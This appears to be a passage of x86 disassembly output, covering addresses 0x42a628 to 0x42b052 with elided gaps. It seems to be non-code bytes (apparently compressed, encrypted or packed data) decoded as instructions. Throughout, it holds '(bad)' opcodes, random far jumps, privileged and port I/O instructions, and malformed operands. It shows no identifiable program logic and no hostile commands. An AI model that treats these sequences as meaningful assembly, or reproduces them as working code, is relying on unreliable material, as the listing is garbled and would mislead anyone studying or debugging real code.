  42a628:	(bad)  
  42a629:	sbb    bl,al
  42a62b:	add    eax,DWORD PTR [edx+ebp*1+0x1d942401]
  42a632:	aam    0xe7
  42a634:	add    al,0x0
	...
  42a696:	and    al,0x16
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0x1467323b
  42a6a3:	retf   0x8423
  42a6a6:	jge    0x42a66d
  42a6a8:	add    DWORD PTR [eax],eax
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    BYTE PTR [ebp-0x24],al
  42a6b0:	jo     0x42a6c6
  42a6b2:	xchg   edx,eax
  42a6b3:	xchg   esp,eax
  42a6b4:	pop    esi
  42a6b5:	inc    ebp
  42a6b6:	ror    BYTE PTR [ebp+0x1b410427],1
  42a6bc:	icebp  
  42a6bd:	fcomp  DWORD PTR [ebp+0x3a06816d]
  42a6c3:	jg     0x42a690
  42a6c5:	ret    
  42a6c6:	jno    0x42a695
  42a6c8:	xchg   DWORD PTR [ebp-0x50b46a39],edx
  42a6ce:	sub    DWORD PTR [esp+edx*8],ebx
  42a6d1:	sar    DWORD PTR [eax-0x1a6ef417],cl
  42a6d7:	inc    ecx
  42a6d8:	mov    DWORD PTR [ecx-0x7c],esi
  42a6db:	pop    ebx
  42a6dc:	iret   
  42a6dd:	fwait
  42a6de:	or     al,0x5b
  42a6e0:	mov    edx,0xee8fcbc6
  42a6e5:	xor    eax,0xb75fa7f7
  42a6ea:	and    ah,BYTE PTR [esi+eax*8]
  42a6ed:	rcl    DWORD PTR [ebp-0x29],0x63
  42a6f1:	lahf   
  42a6f2:	mov    ecx,0x5fcf68ad
  42a6f7:	in     eax,0xe
  42a6f9:	in     al,0xec
  42a6fb:	fwait
  42a6fc:	or     ch,BYTE PTR [ebp-0x65]
  42a6ff:	xchg   ebp,eax
  42a700:	mov    dh,0xc5
  42a703:	(bad)  
  42a704:	cmp    eax,0xb7b80752
  42a709:	push   0xffffffde
  42a70b:	gs iret 
  42a70d:	inc    ecx
  42a70e:	rol    edx,1
  42a710:	fist   WORD PTR [ebx+0x1e6961d4]
  42a716:	ins    DWORD PTR es:[edi],dx
  42a717:	shl    BYTE PTR [ebx-0x37],0xf6
  42a71b:	int3   
  42a71c:	gs xchg ebx,eax
  42a71e:	mov    bl,0x3f
  42a720:	mov    ds,edx
  42a722:	test   BYTE PTR [edi],ah
  42a724:	ins    BYTE PTR es:[edi],dx
  42a725:	out    0x51,eax
  42a727:	imul   edx,DWORD PTR [edi+0x2c230d57]
  42a72e:	dec    edx
  42a72f:	cld    
  42a730:	ss mov ah,0x85
  42a733:	mov    ah,0x24
  42a735:	div    DWORD PTR [edx]
  42a737:	stos   DWORD PTR es:[edi],eax
  42a738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a739:	out    dx,al
  42a73a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42a73c:	cdq    
  42a73d:	test   BYTE PTR [ebp-0x36e5947c],dh
  42a743:	and    ah,ch
  42a745:	popa   
  42a746:	jno    0x42a7a8
  42a748:	sub    dl,cl
  42a74a:	mov    es,WORD PTR [edx-0x531ec42a]
  42a750:	js     0x42a7b1
  42a752:	test   edi,esi
  42a754:	mov    eax,ds:0xfd8a69e9
  42a759:	retf   0xc9a9
  42a75c:	pop    esp
  42a75d:	inc    ebx
  42a75e:	mov    dh,0x1a
  42a760:	gs xor eax,0xa358580a
  42a766:	xor    ecx,DWORD PTR [ecx+0x3a421cb6]
  42a76c:	pop    eax
  42a76d:	lods   al,BYTE PTR ds:[esi]
  42a76e:	cli    
  42a76f:	mov    al,0x30
  42a771:	mov    eax,0x78938edf
  42a776:	pop    ecx
  42a777:	dec    esp
  42a778:	cs sti 
  42a77a:	enter  0x6bec,0xb1
  42a77e:	pop    edx
  42a77f:	jmp    0x7c51:0x8bbed2c5
  42a786:	jge    0x42a714
  42a788:	jo     0x42a736
  42a78a:	imul   ebx,DWORD PTR [ebx+eax*2+0x1b],0xffffff93
  42a78f:	add    ch,al
  42a791:	adc    al,0x17
  42a793:	daa    
  42a794:	shl    DWORD PTR [edx],cl
  42a796:	jmp    0x36ee08fb
  42a79b:	call   edx
  42a79d:	jmp    0x34e2:0x6c1bc07
  42a7a4:	xor    eax,0xa75325f6
  42a7a9:	dec    esp
  42a7aa:	scas   eax,DWORD PTR es:[edi]
  42a7ab:	outs   dx,DWORD PTR ds:[esi]
  42a7ac:	ror    esi,cl
  42a7ae:	push   ebx
  42a7af:	and    BYTE PTR [ebx+0x3c2855fe],dh
	...
  42a815:	add    BYTE PTR [edx-0x10409c9b],cl
  42a81b:	mov    edi,0x497a75de
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	sti    
  42a823:	leave  
  42a824:	loop   0x42a860
  42a826:	test   dh,al
  42a828:	add    DWORD PTR [eax],eax
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [esi],cl
  42a82f:	mov    fs,edi
  42a831:	arpl   WORD PTR [eax],sp
  42a833:	mov    dh,0x81
  42a835:	inc    BYTE PTR [edx]
  42a837:	jmp    0x2d5a:0x23e192a5
  42a83e:	adc    BYTE PTR [ecx],ah
  42a840:	retf   
  42a841:	push   ecx
  42a842:	aas    
  42a843:	and    DWORD PTR [edi],esp
  42a845:	pop    edi
  42a846:	mov    edx,0x7a9047ad
  42a84b:	push   edi
  42a84c:	out    dx,eax
  42a84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a84e:	inc    edi
  42a84f:	sbb    esp,ebx
  42a851:	or     ebx,ecx
  42a853:	out    dx,eax
  42a854:	enter  0x4ffe,0x31
  42a858:	cmc    
  42a859:	sbb    DWORD PTR [edi],0x5f9b01fb
  42a85f:	stc    
  42a860:	jle    0x42a87b
  42a862:	(bad)  
  42a863:	cmp    DWORD PTR [ebx+0x624f22c4],eax
  42a869:	add    ebp,DWORD PTR [ebp-0x4adc8416]
  42a86f:	popf   
  42a870:	sar    esp,1
  42a872:	out    0xde,al
  42a874:	pop    ss
  42a875:	xchg   ebx,eax
  42a876:	jns    0x42a840
  42a878:	fstp   QWORD PTR [eax+eiz*4-0x7b]
  42a87c:	xchg   ebx,eax
  42a87d:	sub    ecx,DWORD PTR [eax]
  42a87f:	push   0x8d82ed69
  42a884:	rcl    BYTE PTR [esi+ecx*8+0x75],0xf2
  42a889:	(bad)  
  42a88a:	pop    esp
  42a88b:	cmp    eax,0x51c29e04
  42a890:	or     ch,dh
  42a892:	adc    BYTE PTR [eax],cl
  42a894:	popf   
  42a895:	add    dl,dl
  42a897:	pop    ds
  42a898:	out    0x83,eax
  42a89a:	sbb    BYTE PTR [ebp-0x32],ch
  42a89d:	ins    DWORD PTR es:[edi],dx
  42a89e:	fsub   DWORD PTR [esp+edx*4+0x7a]
  42a8a2:	psrad  mm0,0x5f
  42a8a6:	push   esp
  42a8a7:	mov    BYTE PTR [ebp-0x7],bl
  42a8aa:	jae    0x42a8d4
  42a8ac:	inc    edx
  42a8ad:	and    ebx,eax
  42a8af:	or     BYTE PTR [esi-0x1229c228],dl
  42a8b5:	or     BYTE PTR [eax-0x3bc730fa],cl
  42a8bb:	cmp    BYTE PTR [ecx-0x39],0xe6
  42a8bf:	jmp    0x42a936
  42a8c1:	sahf   
  42a8c2:	cdq    
  42a8c3:	sbb    ebx,edi
  42a8c5:	xor    ebp,DWORD PTR [esi-0x28]
  42a8c8:	and    eax,0xcd3507fd
  42a8cd:	inc    edx
  42a8ce:	jp     0x42a8dd
  42a8d0:	jmp    0xf67933ba
  42a8d5:	lahf   
  42a8d6:	sbb    DWORD PTR [ecx-0x172d1942],ebp
  42a8dc:	inc    edx
  42a8dd:	mov    WORD PTR [ebx],ss
  42a8df:	pop    edx
  42a8e0:	or     al,BYTE PTR [edx-0x56]
  42a8e3:	pop    eax
  42a8e4:	clc    
  42a8e5:	cdq    
  42a8e6:	es mov esi,0x1f9417c8
  42a8ec:	enter  0x9183,0x71
  42a8f0:	mov    BYTE PTR ds:0x2ed4fa56,bh
  42a8f6:	div    DWORD PTR [ecx+0x3dafb674]
  42a8fc:	pop    DWORD PTR [edi-0x30db4e30]
  42a902:	rol    BYTE PTR [esi],cl
  42a904:	sub    ebx,edi
  42a906:	mov    al,ds:0x8788a003
  42a90b:	leave  
  42a90c:	cmp    eax,0x3d89fd5b
  42a911:	test   BYTE PTR [edx-0x6eb1d35],cl
  42a917:	cld    
  42a918:	xchg   BYTE PTR [edx],bl
  42a91a:	mov    al,0x5a
  42a91c:	inc    esp
  42a91d:	xchg   edi,eax
  42a91e:	mov    bh,0x6c
  42a920:	inc    eax
  42a921:	stos   DWORD PTR es:[edi],eax
  42a922:	xchg   esi,eax
  42a923:	test   al,0x42
  42a925:	ror    BYTE PTR [ebx],cl
  42a927:	jae    0x42a9a1
  42a929:	dec    edi
  42a92a:	sahf   
  42a92b:	mov    eax,ds:0x885027e2
  42a930:	xor    eax,DWORD PTR [eax]
  42a932:	in     al,0xf5
  42a934:	(bad)  
	...
  42a995:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a99b:	out    dx,al
  42a99c:	sti    
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     ebx,DWORD PTR [ecx]
  42a9a3:	sbb    eax,0xc78bd2a7
  42a9a8:	add    DWORD PTR [eax],eax
  42a9aa:	pop    es
  42a9ab:	add    DWORD PTR [eax],eax
  42a9ad:	add    BYTE PTR [ecx-0x1dcf292a],dh
  42a9b3:	and    DWORD PTR [edx],ebp
  42a9b5:	dec    ecx
  42a9b6:	mov    bl,dl
  42a9b8:	mov    ah,0x9a
  42a9ba:	repz js 0x42a992
  42a9bd:	xor    DWORD PTR [ebx+0x69eee3cc],edx
  42a9c3:	mul    BYTE PTR [edi]
  42a9c5:	dec    ebx
  42a9c6:	(bad)  
  42a9c7:	imul   esp,DWORD PTR [eax+0x5cb6a67e],0xffffffba
  42a9ce:	mov    eax,0x1ba9b211
  42a9d3:	add    ebp,DWORD PTR [ebp+0x75]
  42a9d6:	mov    bh,0xb7
  42a9d8:	add    dh,bh
  42a9da:	int    0xaf
  42a9dc:	mov    edi,0xdfad4aae
  42a9e1:	mov    ds:0xb6bcaa67,al
  42a9e6:	into   
  42a9e7:	int3   
  42a9e8:	in     al,dx
  42a9e9:	loope  0x42a9c6
  42a9eb:	sbb    eax,0xbaf52f7
  42a9f0:	stos   DWORD PTR es:[edi],eax
  42a9f1:	pushf  
  42a9f2:	ror    DWORD PTR [edi-0x3],cl
  42a9f5:	xchg   ecx,eax
  42a9f6:	repz data16 xor al,0x40
  42a9fa:	adc    eax,0x4740ba82
  42a9ff:	lock mov WORD PTR [eax-0x61],fs
  42aa03:	mov    cl,0xb6
  42aa05:	xor    al,0xb4
  42aa07:	xchg   edx,eax
  42aa08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa09:	mov    esp,0x15446664
  42aa0e:	xchg   DWORD PTR ds:0x7a9d4c7f,esi
  42aa14:	pop    ebx
  42aa15:	daa    
  42aa16:	rcl    BYTE PTR [edi+0x12926db1],0x3a
  42aa1d:	fisttp QWORD PTR es:[esi-0x1e]
  42aa21:	mov    ch,0x92
  42aa23:	push   ecx
  42aa24:	jns    0x42aa44
  42aa26:	cld    
  42aa27:	sbb    BYTE PTR [ecx-0x66],ch
  42aa2a:	pop    ds
  42aa2b:	mov    WORD PTR [ecx+eiz*2+0x57],?
  42aa2f:	or     DWORD PTR [esi-0x26],ebp
  42aa32:	cmc    
  42aa33:	aas    
  42aa34:	mov    ecx,0x6435f435
  42aa39:	push   edi
  42aa3a:	jne    0x42a9c9
  42aa3c:	ds or  al,0x3f
  42aa3f:	ficom  WORD PTR [esi+ebp*8+0x77]
  42aa43:	cwde   
  42aa44:	ret    0x7038
  42aa47:	enter  0x4c90,0xf9
  42aa4b:	aas    
  42aa4c:	(bad)  [esi-0x46]
  42aa4f:	fucomip st,st(7)
  42aa51:	test   BYTE PTR [ecx],0x17
  42aa54:	xchg   ecx,eax
  42aa55:	pop    ss
  42aa56:	mov    ecx,esp
  42aa58:	rol    DWORD PTR [esi],1
  42aa5a:	mov    ch,0xe5
  42aa5c:	out    0x85,al
  42aa5e:	lods   al,BYTE PTR ds:[esi]
  42aa60:	sub    edx,DWORD PTR [edx-0x15aeedd6]
  42aa66:	jmp    0x63fd78b9
  42aa6b:	pop    eax
  42aa6c:	aaa    
  42aa6d:	shl    BYTE PTR [ecx+0x7be4ac47],cl
  42aa73:	add    ch,BYTE PTR [ecx]
  42aa75:	dec    edx
  42aa76:	icebp  
  42aa77:	cmp    DWORD PTR [esi],esi
  42aa79:	icebp  
  42aa7a:	stos   BYTE PTR es:[edi],al
  42aa7b:	int3   
  42aa7c:	sbb    eax,0xd94eef5d
  42aa81:	mov    bh,BYTE PTR [edi-0x2e]
  42aa84:	int    0x56
  42aa86:	rcl    ecx,1
  42aa88:	mov    BYTE PTR [edi],bl
  42aa8a:	jns    0x42aa9c
  42aa8c:	ret    0x49b6
  42aa8f:	cmp    edx,DWORD PTR [edx]
  42aa91:	mov    esi,0xf3dd5a40
  42aa96:	cmp    BYTE PTR [eax],ah
  42aa98:	push   ds
  42aa99:	mov    ds,WORD PTR [edi-0x421334d7]
  42aa9f:	jmp    0x83a1fe52
  42aaa4:	jge    0x42aa4a
  42aaa6:	es dec ebx
  42aaa8:	mov    ah,0xb0
  42aaaa:	jnp    0xbaf49704
  42aab0:	jge    0x42aac7
  42aab2:	xchg   ebp,eax
  42aab3:	push   ds
  42aab4:	jecxz  0x42aab6
	...
  42ab16:	ds push cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [ebx+0x55],edx
  42ab24:	sub    ch,BYTE PTR [ecx]
  42ab26:	xchg   edx,eax
  42ab27:	enter  0x1,0x7
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [edi-0x60fa5716],dl
  42ab33:	add    dl,BYTE PTR [esi+0x4de5691b]
  42ab39:	push   0xffffff95
  42ab3b:	cmc    
  42ab3c:	ss inc esp
  42ab3e:	mov    ecx,DWORD PTR [eax-0x64]
  42ab41:	retf   
  42ab42:	mov    ds:0xb75e9342,al
  42ab47:	add    BYTE PTR [ecx-0x74],al
  42ab4a:	mov    bh,0x57
  42ab4c:	imul   ebx,ebx,0x8b90e88c
  42ab52:	mov    ebp,0x1c53832f
  42ab57:	fcomp  QWORD PTR ss:[ebx+eiz*4-0x3e2ff818]
  42ab5f:	popf   
  42ab60:	inc    edi
  42ab61:	pop    eax
  42ab62:	cmp    al,BYTE PTR [ecx-0x7a]
  42ab65:	mov    ch,0xd4
  42ab67:	test   al,0xb7
  42ab69:	(bad)  
  42ab6a:	rcr    DWORD PTR [edi+0x39],1
  42ab6d:	jl     0x42ab07
  42ab6f:	mov    bh,0xaf
  42ab71:	add    dh,BYTE PTR [ecx]
  42ab73:	push   es
  42ab74:	mov    ds:0xcb34da56,eax
  42ab79:	mov    dh,0x3b
  42ab7b:	push   edx
  42ab7c:	repz (bad) 
  42ab7e:	imul   esi,DWORD PTR [edi],0x79
  42ab81:	pop    ecx
  42ab82:	fnsave [ecx]
  42ab84:	jae    0x42ab52
  42ab86:	pop    ecx
  42ab87:	rcr    DWORD PTR [ecx-0x6d],cl
  42ab8a:	push   esi
  42ab8b:	add    BYTE PTR [ecx-0x219a3f3b],cl
  42ab91:	push   0x3f7c0e4a
  42ab96:	ss sbb al,0xba
  42ab99:	ds sar ebp,1
  42ab9c:	ins    BYTE PTR es:[edi],dx
  42ab9d:	(bad)  
  42ab9e:	in     eax,0x96
  42aba0:	jmp    0x777b:0x7ce2dcf3
  42aba7:	test   al,0xdb
  42aba9:	(bad)  
  42abaa:	sbb    eax,eax
  42abac:	jne    0x42abd2
  42abae:	jno    0x42abe4
  42abb0:	xor    DWORD PTR ds:0x1a981adc,esp
  42abb6:	out    0x9a,eax
  42abb8:	add    ah,0x35
  42abbb:	jle    0x42ab84
  42abbd:	mov    ebp,0x3a7331c7
  42abc2:	inc    edx
  42abc3:	fimul  DWORD PTR [esi-0x1f]
  42abc6:	lahf   
  42abc7:	jmp    0xf9c33c02
  42abcc:	or     cl,BYTE PTR [ebx-0x77]
  42abcf:	in     al,0x93
  42abd1:	xchg   edx,eax
  42abd2:	mov    ?,WORD PTR ds:0xc0ed1d67
  42abd8:	xchg   esi,eax
  42abd9:	mov    ah,0x46
  42abdb:	mov    eax,ds:0x2fd9ed5f
  42abe0:	test   DWORD PTR [ebp+0x1eb64cdc],edx
  42abe6:	lds    ebx,FWORD PTR [eax-0x53]
  42abe9:	and    bl,ch
  42abeb:	fisttp WORD PTR [esi]
  42abed:	cwde   
  42abee:	push   ebx
  42abef:	pop    eax
  42abf0:	or     al,0x1f
  42abf2:	fsubr  st,st(0)
  42abf4:	jbe    0x42ac59
  42abf6:	loop   0x42ac59
  42abf8:	or     DWORD PTR [ecx+0x2b],edi
  42abfb:	push   ebx
  42abfc:	mov    bh,0x38
  42abfe:	lock jns 0x42ac1c
  42ac01:	popf   
  42ac02:	imul   ebx,DWORD PTR [edi-0x2bd5ab08],0xb9eef0b4
  42ac0c:	mov    esi,0xef220f96
  42ac11:	out    dx,eax
  42ac12:	ss fucomip st,st(3)
  42ac15:	out    0x78,al
  42ac17:	fidivr DWORD PTR [eax+esi*1+0x768f7439]
  42ac1e:	xchg   ebx,eax
  42ac1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac20:	push   ss
  42ac21:	adc    al,BYTE PTR [eax]
  42ac23:	out    dx,al
  42ac24:	aam    0x26
  42ac26:	(bad)  
  42ac27:	jmp    0xaa20:0xb15eb458
  42ac2e:	mov    ds:0xb0f183ee,al
  42ac33:	or     eax,DWORD PTR [ebx+0x0]
	...
  42ac96:	jmp    0xdf7cc8cd
  42ac9b:	ds out dx,eax
  42ac9d:	repz rcl BYTE PTR [edi+0x24a80a59],cl
  42aca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aca5:	inc    esp
  42aca6:	cdq    
  42aca7:	leave  
  42aca8:	add    DWORD PTR [eax],eax
  42acaa:	pop    es
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    BYTE PTR [esi+ebp*1+0x2ac8cb3d],dh
  42acb4:	shr    ecx,cl
  42acb6:	and    ecx,0xffffffe7
  42acb9:	sbb    dl,BYTE PTR [ebp-0x227db776]
  42acbf:	dec    edi
  42acc0:	xchg   ecx,eax
  42acc1:	lock jecxz 0x42ad26
  42acc4:	call   0x74da49e8
  42acc9:	adc    BYTE PTR [ebx+0x2],dh
  42accc:	push   es
  42accd:	xor    BYTE PTR [ecx-0x39425c30],cl
  42acd3:	arpl   WORD PTR [ebx],sp
  42acd5:	out    0xc2,eax
  42acd7:	sub    al,BYTE PTR [ecx]
  42acd9:	arpl   WORD PTR [eax+0x42ea195b],ax
  42acdf:	adc    cl,0x9c
  42ace2:	pop    es
  42ace3:	in     eax,dx
  42ace4:	retf   0x9b00
  42ace7:	mov    DWORD PTR [eax],ebx
  42ace9:	fistp  QWORD PTR ds:0x8735226a
  42acef:	fwait
  42acf0:	call   0xbdabaf0f
  42acf5:	add    eax,DWORD PTR [esi-0x7]
  42acf8:	add    ebx,0xffffffa4
  42acfb:	push   esp
  42acfc:	aam    0xf1
  42acfe:	lods   al,BYTE PTR ds:[esi]
  42acff:	aaa    
  42ad00:	repz fst DWORD PTR [ebp+esi*4-0xb]
  42ad05:	xlat   BYTE PTR ds:[ebx]
  42ad06:	sbb    al,0x22
  42ad08:	call   0xd229a5d2
  42ad0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad0e:	pop    ss
  42ad0f:	ins    BYTE PTR es:[edi],dx
  42ad10:	pop    ebx
  42ad11:	stc    
  42ad12:	aam    0xa7
  42ad14:	cdq    
  42ad15:	retf   0xed37
  42ad18:	or     ebp,DWORD PTR [eax]
  42ad1a:	cmp    DWORD PTR [eax-0x5d49aede],ebx
  42ad20:	loop   0x42ad0b
  42ad22:	cmp    BYTE PTR [edi-0x611e6256],0xac
  42ad29:	shl    al,0xd8
  42ad2c:	rcl    ch,0x99
  42ad2f:	imul   esi,DWORD PTR [edi+esi*8-0x7f],0xffffff90
  42ad34:	mov    ds:0x603b8336,al
  42ad39:	ret    0xe164
  42ad3c:	ret    0x2117
  42ad3f:	ins    BYTE PTR es:[edi],dx
  42ad40:	mov    edi,0x3e7faa17
  42ad45:	push   ebp
  42ad46:	adc    dl,BYTE PTR [esi+esi*1-0x37ff9e2d]
  42ad4d:	inc    ebx
  42ad4e:	dec    eax
  42ad4f:	inc    ebx
  42ad50:	xchg   DWORD PTR [edi+0x6e],edx
  42ad53:	into   
  42ad54:	stos   DWORD PTR es:[edi],eax
  42ad55:	call   0x99899623
  42ad5a:	and    DWORD PTR [edx+0x5ce8fa03],ebp
  42ad60:	jmp    FWORD PTR [eax-0x28]
  42ad63:	pop    eax
  42ad64:	jb     0x42aceb
  42ad66:	ror    DWORD PTR [edi-0x4e],1
  42ad69:	xchg   edx,eax
  42ad6a:	int3   
  42ad6b:	inc    ebx
  42ad6c:	push   edx
  42ad6d:	jmp    0xb7cb:0x82b1e853
  42ad74:	stos   DWORD PTR es:[edi],eax
  42ad75:	retf   
  42ad76:	int    0x16
  42ad78:	adc    esp,DWORD PTR ds:0xa8c42f8d
  42ad7e:	rol    BYTE PTR [esi],1
  42ad80:	scas   al,BYTE PTR es:[edi]
  42ad81:	xchg   DWORD PTR [ebx-0x6abe991f],esp
  42ad87:	sub    DWORD PTR [eax],ebp
  42ad89:	aas    
  42ad8a:	sbb    eax,0xd26e6af4
  42ad8f:	push   esi
  42ad90:	dec    esi
  42ad91:	push   esp
  42ad92:	jmp    0x427c:0xdc491355
  42ad99:	pusha  
  42ad9a:	or     ebp,ebp
  42ad9c:	sbb    BYTE PTR [eax+edi*8],0xad
  42ada0:	loopne 0x42ada2
  42ada2:	sbb    BYTE PTR [esi-0x510b307e],0x27
  42ada9:	cmp    BYTE PTR [edx-0x2d292e75],cl
  42adaf:	fsubr  st,st(6)
  42adb1:	mov    ds:0x95b96c,al
	...
  42ae16:	mov    edi,0x4a8e4af7
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [edi+edi*1-0x5ff23636]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    ch,dl
  42ae2f:	lahf   
  42ae30:	ins    DWORD PTR es:[edi],dx
  42ae31:	les    edi,FWORD PTR [eax+0x4c]
  42ae34:	sbb    eax,0xb733ae2b
  42ae39:	cmp    bh,dl
  42ae3b:	stc    
  42ae3c:	pop    ss
  42ae3d:	sbb    eax,0x4fc0d27b
  42ae42:	ins    DWORD PTR es:[edi],dx
  42ae43:	xchg   esp,eax
  42ae44:	jnp    0x42ae65
  42ae46:	mov    eax,ds:0xadda7dab
  42ae4b:	mov    dh,0xdb
  42ae4d:	imul   edx,DWORD PTR [ecx+0x542df4d4],0x5f
  42ae54:	pop    esp
  42ae55:	lock mov edx,DWORD PTR [esi+0x77109198]
  42ae5c:	sar    BYTE PTR [eax+esi*8],1
  42ae5f:	int    0xc4
  42ae61:	mov    ebx,0xa4dfcd85
  42ae66:	push   ebx
  42ae67:	xor    dl,ah
  42ae69:	ja     0x42ae08
  42ae6b:	out    dx,al
  42ae6c:	(bad)  
  42ae6d:	fdiv   st,st(5)
  42ae6f:	adc    eax,0x98e58049
  42ae74:	in     al,dx
  42ae75:	or     eax,0xec8b339a
  42ae7a:	rol    BYTE PTR [ebp+0x5f6e3b54],0x1b
  42ae81:	test   eax,0x4f409ac0
  42ae86:	jmp    0xa7abfb2f
  42ae8b:	les    ebx,FWORD PTR [eax-0x78]
  42ae8e:	bound  esi,QWORD PTR [eax-0x6a]
  42ae91:	sub    al,BYTE PTR [ecx]
  42ae93:	ficom  WORD PTR ds:0x6ef039a
  42ae99:	sub    cl,dh
  42ae9b:	imul   ecx,DWORD PTR [eax+0x27df68d0],0x21
  42aea2:	popf   
  42aea3:	xchg   ebx,eax
  42aea4:	xor    ah,BYTE PTR [edi+0x72607f92]
  42aeaa:	ja     0x42af2b
  42aeac:	mov    bl,0x68
  42aeae:	sbb    esp,ebx
  42aeb0:	enter  0xb63d,0xf2
  42aeb4:	push   0xffffff8f
  42aeb6:	jg     0x42ae4f
  42aeb8:	xchg   ebp,eax
  42aeb9:	adc    al,0x9e
  42aebb:	xor    edx,DWORD PTR [esi+0x131d5cee]
  42aec1:	retf   0x456e
  42aec4:	rcl    BYTE PTR [esi],0x9c
  42aec7:	pop    ss
  42aec8:	push   cs
  42aec9:	icebp  
  42aeca:	or     dh,dl
  42aecc:	cs stos DWORD PTR es:[edi],eax
  42aece:	jne    0x42ae65
  42aed0:	jne    0x42aeb1
  42aed2:	cmp    ah,BYTE PTR [ebx]
  42aed4:	dec    ecx
  42aed5:	int3   
  42aed6:	shr    DWORD PTR [eax],1
  42aed8:	cdq    
  42aed9:	push   eax
  42aeda:	(bad)  
  42aedb:	icebp  
  42aedc:	scas   al,BYTE PTR es:[edi]
  42aedd:	call   0xa135:0x9ba8eb05
  42aee4:	xor    al,0x2b
  42aee6:	adc    BYTE PTR [edi+0x5f93f6be],bl
  42aeec:	out    0x89,eax
  42aeee:	js     0x42af02
  42aef0:	inc    esp
  42aef1:	mov    esp,0x671a8da0
  42aef6:	adc    al,0x49
  42aef8:	loopne 0x42aef4
  42aefa:	scas   al,BYTE PTR es:[edi]
  42aefb:	dec    esi
  42aefc:	xchg   BYTE PTR [ebp+0x3f],bh
  42aeff:	pop    DWORD PTR [ebp-0x67]
  42af02:	ret    
  42af03:	and    edx,DWORD PTR [edi+0x38]
  42af06:	and    al,0x36
  42af08:	(bad)  
  42af09:	out    dx,eax
  42af0a:	jmp    0xe107f91a
  42af0f:	lea    ebp,[esi+edi*1-0x7ee66416]
  42af16:	xor    BYTE PTR [ebx-0x526d87f8],bl
  42af1c:	push   ebp
  42af1d:	jo     0x42af8f
  42af1f:	ss push esi
  42af21:	xchg   ebp,eax
  42af22:	dec    edx
  42af23:	xor    al,0x36
  42af25:	and    DWORD PTR [ecx-0x6fe65f4f],edi
  42af2b:	xchg   edi,eax
  42af2c:	and    eax,0xc8a0e0d3
  42af31:	jle    0x42aeff
  42af33:	mov    bl,0xda
	...
  42af95:	add    cl,bh
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp+0x59d417ea],0xffffff83
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [ecx-0x2feb7f7f],ch
  42afb3:	rcl    DWORD PTR [eax],1
  42afb5:	xlat   BYTE PTR ds:[ebx]
  42afb6:	fimul  DWORD PTR ds:0x884f1317
  42afbc:	jmp    0x18e1:0x2137cb0b
  42afc3:	or     eax,eax
  42afc5:	push   edi
  42afc6:	add    esi,DWORD PTR [ebp+0x53]
  42afc9:	test   eax,0x1632ebd2
  42afce:	inc    edx
  42afcf:	in     eax,dx
  42afd0:	fwait
  42afd1:	pop    ss
  42afd2:	popf   
  42afd3:	push   0x46090899
  42afd8:	outs   dx,BYTE PTR ds:[esi]
  42afd9:	cld    
  42afda:	adc    dh,dh
  42afdc:	inc    esp
  42afdd:	adc    al,bl
  42afdf:	cmc    
  42afe0:	fild   WORD PTR [edx+0x2cfa547]
  42afe6:	sbb    eax,0xfd8b58ba
  42afeb:	add    BYTE PTR [edx-0x79],0xba
  42afef:	scas   eax,DWORD PTR es:[edi]
  42aff0:	repz add eax,0x394daecc
  42aff6:	pop    ebx
  42aff7:	fidiv  WORD PTR [eax]
  42aff9:	cwde   
  42affa:	ret    0x4a82
  42affd:	fisttp QWORD PTR [esi-0x13f9c855]
  42b003:	dec    esp
  42b004:	push   esi
  42b005:	push   ecx
  42b006:	mov    fs,WORD PTR [edx+0x3ef3d4ad]
  42b00c:	jne    0x42b078
  42b00e:	outs   dx,DWORD PTR ds:[esi]
  42b00f:	mov    ch,0xa3
  42b011:	imul   edi,ebp,0x6955ffeb
  42b017:	cmp    BYTE PTR [ebp+0x336424ce],0xd9
  42b01e:	push   eax
  42b01f:	push   esp
  42b020:	push   ebp
  42b021:	mov    ds:0x70242e7f,eax
  42b026:	jp     0x42b02b
  42b028:	or     DWORD PTR [eax],eax
  42b02a:	into   
  42b02b:	dec    esi
  42b02c:	pop    ebp
  42b02d:	mov    ebx,0x89031c4f
  42b032:	add    al,0xfc
  42b034:	and    bl,al
  42b036:	dec    ecx
  42b037:	push   eax
  42b038:	jecxz  0x42b079
  42b03a:	or     ebp,DWORD PTR ds:0x695e58ab
  42b040:	push   esi
  42b041:	mov    eax,edx
  42b043:	out    dx,eax
  42b044:	mov    bh,0x6
  42b046:	sahf   
  42b047:	cs jmp 0x98e25d65
  42b04d:	lahf   
  42b04e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b04f:	aas    
  42b050:	pop    ebx
  42b051:	icebp  
  42b052:	jns    0x42afe7
